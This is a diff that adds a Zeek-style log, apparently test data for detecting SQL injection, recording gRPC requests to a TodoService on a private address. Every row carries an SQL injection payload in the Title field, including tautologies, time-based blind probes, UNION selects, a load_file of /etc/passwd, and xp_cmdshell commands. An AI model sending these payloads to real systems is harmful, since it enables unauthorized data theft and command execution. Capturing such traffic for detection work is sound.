@@ -1,0 +1,133 @@
+#separator \x09
+#set_separator	,
+#empty_field	(empty)
+#unset_field	-
+#path	sqli_grpc
+#fields	method	authority	host	original_URI	text
+#types	string	string	string	string	string
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title )%20or%20('x'='x 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title ; execute immediate 'sel' || 'ect us' || 'er' 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title ";waitfor delay '0:0:__TIME__'-- 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title ||(elt(-3+5,bin(15),ord(10),hex(char(45)))) 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title " or sleep(__TIME__)# 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  or 0=0 # 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title ) or ('a'='a 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title ; exec xp_regread 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title " or benchmark(10000000,MD5(1))# 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  or 0=0 -- 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  or 'a'='a 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title ) or sleep(__TIME__)=' 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title )) or benchmark(10000000,MD5(1))# 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title hi' or 'a'='a 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  or 1=1 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  or 2 > 1 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title ")) or benchmark(10000000,MD5(1))# 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title hi') or ('a'='a 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  or 3=3 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title ));waitfor delay '0:0:__TIME__'-- 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title a' waitfor delay '0:0:10'-- 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title or 1=1 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  and 1 in (select var from temp)-- 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  or '7659'='7659 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  or 'text' = n'text' 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  or 1=1 or ''=' 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title declare @s varchar (200) select @s = 0x73656c6 ... 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title ; exec master..xp_cmdshell 'ping 172.10.1.255'-- 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  or pg_sleep(__TIME__)--" 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title x' AND email IS NULL; -- 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title admin' or ' 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  or 'unusual' = 'unusual' 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title declare @s varchar(200) select @s = 0x77616974 ... 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title "));waitfor delay '0:0:__TIME__'-- 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title or isNULL(1/0) /* 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title x' AND members.email IS NULL; -- 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  or 1=1-- 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  and 1=( if((load_file(char(110,46,101,120,11 ... 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  union all select @@version-- 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  or pg_sleep(__TIME__)-- 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title hi' or 'x'='x'; 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title ) or sleep(__TIME__)= 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  or 'whatever' in ('whatever') 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title ; begin declare @var varchar(8000) set @var=' ... 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  union select 1,load_file('/etc/passwd'),1,1,1; 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title exec(@s) 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title ) or pg_sleep(__TIME__)-- 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  union select 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  or sleep(__TIME__)# 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  select * from information_schema.tables-- 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title a' or 1=1-- 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title a' or 'a' = 'a 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title declare @s varchar(22) select @s = 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  or '1'='1 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  or sleep(__TIME__)=' 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  or 1 --' 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title or 0=0 #" 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title " or isNULL(1/0) /* 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title declare @s varchar (8000) select @s = 0x73656c ... 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  having 1=1-- 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title ) or benchmark(10000000,MD5(1))# 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  or username like char(37); 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title ;waitfor delay '0:0:__TIME__'-- 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  or 1=1--" 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title x' AND userid IS NULL; -- 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  or 'text' > 't' 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  or benchmark(10000000,MD5(1))# 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title ");waitfor delay '0:0:__TIME__'-- 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title a' or 3=3-- 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  group by userid having 1=1-- 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  or ''=' 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title ; exec master..xp_cmdshell 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title )) or sleep(__TIME__)=""" 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title hi' or 1=1 -- 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title ") or pg_sleep(__TIME__)-- 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  or 'something' = 'some'+'thing' 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title ) or (a=a 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title )) or pg_sleep(__TIME__)-- 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title x' AND 1=(SELECT COUNT(*) FROM tabname); -- 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title ; exec ('sel' + 'ect us' + 'er') 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title anything' OR 'x'='x 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title or 0=0 -- 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title or 0=0 # 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title );waitfor delay '0:0:__TIME__'-- 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title ) or benchmark(10000000,MD5(1))#" 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  or 1=1 /* 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title )) or sleep(__TIME__)=' 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title or 1=1 or ""= 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  or 1 in (select @@version)-- 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  union select * from users where login = char ... 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title x' or 1=1 or 'x'='y 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  or '1'='1'-- 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title a" or 1=1-- 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title " or 0=0 -- 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title )) or pg_sleep(__TIME__)--" 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  or 1/* 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s)  
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s) 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title ' or 1=1 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title \x18 or 1=1 -- 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title x' OR full_name LIKE '%Bob% 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title '; exec master..xp_cmdshell 'ping 172.10.1.255'-- 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title ')%20or%20('x'='x 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title ' or 0=0 -- 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title ' or 0=0 # 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title  or 0=0 #" 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title ' or 1=1-- 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title ' or '1'='1'-- 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title ' or 1 --' 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title or 1=1-- 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title ' or 1=1 or ''=' 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title ' or a=a-- 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title ') or ('a'='a 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title ' or username like '% 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title ' or uname like '% 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title ' or userid like '% 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title ' or uid like '% 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title ' or user like '% 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title '; exec master..xp_cmdshell 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title '; exec xp_regread 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title t'exec master..xp_cmdshell 'nslookup www.google.com'-- 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title ' UNION SELECT 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title ' UNION ALL SELECT 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title ' or ''=' 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title ' or 3=3 
+POST	172.16.210.133	172.16.210.133	/todo.TodoService/CreateTodoItem	Title ' or 3=3 -- 
